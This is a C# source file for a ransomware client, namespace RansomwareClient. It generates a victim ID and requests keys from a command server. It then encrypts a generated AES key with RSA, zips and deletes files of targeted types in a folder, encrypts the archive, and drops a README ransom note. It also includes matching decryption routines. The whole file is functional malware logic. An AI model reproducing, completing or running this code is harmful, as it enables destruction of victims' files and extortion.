using ICSharpCode.SharpZipLib.Core;
using ICSharpCode.SharpZipLib.Zip;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace RansomwareClient
{
    public class Ransom
    {

        public static void Encrypt()
        {
            //generate an unique id for the user, to attach to the server side
            var victim_id = Guid.NewGuid().ToString();
            //set keys
            Utility.SetRegistryKeyValuePair("Id", victim_id, false);//set to true for live
            Utility.SetRegistryKeyValuePair("Server Public Key", Utility.RequestFromServer("publickey"));
            var AES = GetAES();
            var symmetric_key = Encoding.UTF8.GetBytes(Convert.ToBase64String(AES.Key.Concat(AES.IV).ToArray()));
            var public_key = Utility.RequestFromServer($"ransom/{victim_id}");
            Utility.SetRegistryKeyValuePair("Public Key", public_key);

            //encrypt symmetric key
            var RSA = new RSACryptoServiceProvider();
            RSA.FromXmlString(public_key);
            var encrypted_key = Convert.ToBase64String(RSA.Encrypt(symmetric_key, true));
            Utility.SetRegistryKeyValuePair("EncryptedAES", encrypted_key);

            //find, archive, zip files
            var container_file = File.Create(App.PRECRYPT_FILE_PATH);
            using (var zipStream = new ZipOutputStream(container_file))
            {
                zipStream.SetLevel(0); //fastest zip
                var folderOffset = App.TARGET_FOLDER.Length + (App.TARGET_FOLDER.EndsWith("\\") ? 0 : 1);
                CompressFolder(App.TARGET_FOLDER, zipStream, folderOffset); //recursive move
                zipStream.IsStreamOwner = true;

            }
            //encrypt files
            using (var plainfs = File.Open(App.PRECRYPT_FILE_PATH, FileMode.Open, FileAccess.Read, FileShare.Read))
            using (var cryptfs = File.Open(App.POSTCRYPT_FILE_PATH, FileMode.Create, FileAccess.Write, FileShare.None))
            using (var cs = new CryptoStream(cryptfs, AES.CreateEncryptor(AES.Key, AES.IV), CryptoStreamMode.Write))
            {
                plainfs.CopyTo(cs);
            }

            File.Delete(App.PRECRYPT_FILE_PATH);
            File.WriteAllText($"{App.TARGET_DRIVE}README.txt", Message.README);
        }

        public static void Decrypt()
        {

            var RSA = new RSACryptoServiceProvider();
            RSA.FromXmlString(Utility.GetRegistryValue("AESPrivateKey"));
            var decrypted = Convert.FromBase64String(Encoding.UTF8.GetString(RSA.Decrypt(Convert.FromBase64String(Utility.GetRegistryValue("EncryptedAES")), true)));
            var AES_Key = decrypted.Take(32).ToArray();
            var AES_IV = decrypted.Skip(32).Take(16).ToArray();

            var AES = new AesCryptoServiceProvider() { KeySize = 256 };
            using (var cryptfs = File.Open(App.POSTCRYPT_FILE_PATH, FileMode.Open, FileAccess.Read, FileShare.Read))
            using (var plainfs = File.Open(App.PRECRYPT_FILE_PATH, FileMode.Create, FileAccess.Write, FileShare.None))
            using (var cs = new CryptoStream(cryptfs, AES.CreateDecryptor(AES_Key, AES_IV), CryptoStreamMode.Read))
            {
                int data;
                while ((data = cs.ReadByte()) != -1)
                {
                    plainfs.WriteByte((byte)data);
                }
            }
            File.Delete(App.POSTCRYPT_FILE_PATH);
        }
        private static void CompressFolder(string path, ZipOutputStream zipStream, int folderOffset)
        {

            var files = Directory.GetFiles(path);

            foreach (string filename in files)
            {
                var split = filename.Split('.');
                if (split.Length <= 0) continue;
                var extension = split[split.Length - 1];
                if (!App.TARGET_FILE_EXTENSIONS.Contains(extension)) continue;
                Console.WriteLine(filename);

                var fi = new FileInfo(filename);

                var entryName = filename.Substring(folderOffset);
                entryName = ZipEntry.CleanName(entryName);
                zipStream.PutNextEntry(new ZipEntry(entryName)
                {
                    DateTime = fi.LastWriteTime,
                    Size = fi.Length,
                });
                var buffer = new byte[4096];
                using (var streamReader = File.OpenRead(filename))
                {
                    StreamUtils.Copy(streamReader, zipStream, buffer);
                }
                zipStream.CloseEntry();
                if (!App.IS_DEBUG) File.Delete(filename);

            }

            var folders = Directory.GetDirectories(path);
            foreach (string folder in folders)
            {
                CompressFolder(folder, zipStream, folderOffset);
            }

        }
        private static AesCryptoServiceProvider GetAES()
        {
            var aes = new AesCryptoServiceProvider() { KeySize = 256 };
            aes.GenerateKey();
            aes.GenerateIV();
            return aes;
        }
    }
 
}
